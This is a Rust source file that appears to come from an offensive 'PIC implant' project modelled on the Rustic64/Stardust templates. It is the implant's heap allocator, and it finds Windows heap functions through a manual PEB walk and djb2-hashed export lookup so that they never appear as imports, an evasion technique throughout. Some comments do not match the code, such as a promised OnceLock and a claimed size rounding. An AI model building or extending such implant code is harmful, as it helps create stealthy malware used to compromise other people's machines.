//! NT-Heap-backed global allocator for the PIC implant.
//!
//! `#![no_std]` + `alloc` needs a registered `GlobalAlloc`. The default process
//! heap (via `RtlAllocateHeap`/`RtlFreeHeap` on ntdll's heap handle) is the
//! path of least resistance and matches what Rustic64/Stardust do: no separate
//! heap to create/tear down, and the host process already owns it.
//!
//! Bootstrapping order matters: the allocator must resolve `RtlAllocateHeap` /
//! `RtlFreeHeap` / `RtlGetProcessHeap` *without* allocating (no Vec, no String),
//! because the resolver in `resolve.rs` uses those collections. So this module
//! does a tiny self-contained PEB walk + export lookup by djb2 hash, captures
//! the three function pointers once into a [`OnceLock`], and then serves every
//! subsequent allocation through them.
//!
//! `cfg(target_os = "windows")` — only compiles on Windows.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicBool, Ordering};

/// Function-pointer table resolved once at first allocation.
struct HeapFns {
    get_process_heap: unsafe extern "system" fn() -> usize,
    allocate: unsafe extern "system" fn(usize, usize, usize) -> *mut core::ffi::c_void,
    free: unsafe extern "system" fn(usize, usize, *mut core::ffi::c_void) -> i32,
}

/// The resolved table (or None until first use). We can't use OnceLock<HeapFns>
/// because once_cell isn't a no_std dep; use a static + AtomicBool guard.
static mut HEAP_FNS: Option<HeapFns> = None;
static RESOLVED: AtomicBool = AtomicBool::new(false);

/// Resolve the heap functions via a PEB walk (no allocation). Idempotent.
unsafe fn ensure_resolved() {
    if RESOLVED.load(Ordering::Acquire) {
        return;
    }
    // Locate ntdll + kernel32 by hash, find the three exports.
    let get_proc = resolve_export(b"RtlGetProcessHeap");
    let alloc_proc = resolve_export(b"RtlAllocateHeap");
    let free_proc = resolve_export(b"RtlFreeHeap");
    if let (Some(g), Some(a), Some(f)) = (get_proc, alloc_proc, free_proc) {
        HEAP_FNS = Some(HeapFns {
            get_process_heap: core::mem::transmute(g),
            allocate: core::mem::transmute(a),
            free: core::mem::transmute(f),
        });
        RESOLVED.store(true, Ordering::Release);
    }
}

/// The process heap handle (cached after first fetch).
static mut PROCESS_HEAP: usize = 0;

unsafe fn process_heap() -> usize {
    if PROCESS_HEAP == 0 {
        ensure_resolved();
        if let Some(fns) = (&*core::ptr::addr_of_mut!(HEAP_FNS)).as_ref() {
            PROCESS_HEAP = (fns.get_process_heap)();
        }
    }
    PROCESS_HEAP
}

/// The global allocator. Registered in lib.rs via `#[global_allocator]`.
pub struct NtHeapAllocator;

unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
    unsafe fn alloc(&self, layout: core::alloc::Layout) -> *mut u8 {
        ensure_resolved();
        let Some(fns) = (&*core::ptr::addr_of_mut!(HEAP_FNS)).as_ref() else {
            return core::ptr::null_mut();
        };
        let heap = process_heap();
        // HEAP_GENERATE_EXCEPTIONS=0, dwBytes=size (rounded up to layout.size),
        // dwFlags=0. RtlAllocateHeap ignores alignment for most cases; size is
        // the binding constraint.
        let ptr = (fns.allocate)(heap, 0, layout.size());
        ptr as *mut u8
    }

    unsafe fn dealloc(&self, ptr: *mut u8, _layout: core::alloc::Layout) {
        ensure_resolved();
        let Some(fns) = (&*core::ptr::addr_of_mut!(HEAP_FNS)).as_ref() else {
            return;
        };
        let heap = process_heap();
        (fns.free)(heap, 0, ptr as *mut core::ffi::c_void);
    }
}

// ---- bootstrap resolver (no allocation; separate from resolve.rs) ---------
//
// Finds an export by name across ntdll + kernel32 via a minimal PEB walk.
// Deliberately standalone so the allocator can bootstrap before the heap-aware
// `resolve` module exists. Returns the function's absolute address.

unsafe fn resolve_export(name: &[u8]) -> Option<usize> {
    let target = crate::resolve::djb2(name);
    // Walk ntdll then kernel32.
    for module_base in [find_module(b"ntdll.dll"), find_module(b"kernel32.dll")] {
        let Some(base) = module_base else { continue };
        if let Some(addr) = export_addr_by_name_hash(base, target) {
            return Some(addr);
        }
    }
    None
}

unsafe fn export_addr_by_name_hash(base: *mut u8, name_hash: u32) -> Option<usize> {
    use crate::resolve::{djb2, ExportDirectory};
    // DOS e_lfanew → NT → optional header → data dir[0] export.
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    if export_rva == 0 {
        return None;
    }
    let dir = base.add(export_rva as usize) as *const ExportDirectory;
    let n = (*dir).number_of_names as usize;
    let names = base.add((*dir).address_of_names as usize) as *const u32;
    let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
    let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
    for i in 0..n {
        let name_rva = *names.add(i);
        let name_ptr = base.add(name_rva as usize);
        let mut h: u32 = 5381;
        let mut p = name_ptr;
        while *p != 0 {
            h = h.wrapping_mul(33).wrapping_add((*p).to_ascii_lowercase() as u32);
            p = p.add(1);
        }
        if h == name_hash {
            let ord = *ordinals.add(i) as usize;
            let fn_rva = *funcs.add(ord);
            return Some(base.add(fn_rva as usize) as usize);
        }
    }
    let _ = djb2; // silence unused import if djb2 not referenced
    None
}

// Reuse the PEB walk from resolve.rs but only need the module base.
unsafe fn find_module(name: &[u8]) -> Option<*mut u8> {
    let h = crate::resolve::djb2(name);
    let peb = peb_ptr()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    while head as *const u8 != start {
        let entry = head as *mut crate::resolve::ListEntry;
        let base = (*entry).dll_base as *mut u8;
        let nb = (*entry).base_dll_name.buffer;
        let nl = (*entry).base_dll_name.length as usize / 2;
        if !base.is_null() && !nb.is_null() && nl > 0 {
            let chars = core::slice::from_raw_parts(nb, nl);
            let mut hh: u32 = 5381;
            for &c in chars {
                let lo = (c & 0xff) as u8;
                hh = hh.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
            }
            if hh == h {
                return Some(base);
            }
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

#[cfg(target_arch = "x86_64")]
unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
    let peb: *mut crate::resolve::Peb;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    Some(peb)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
    None
}
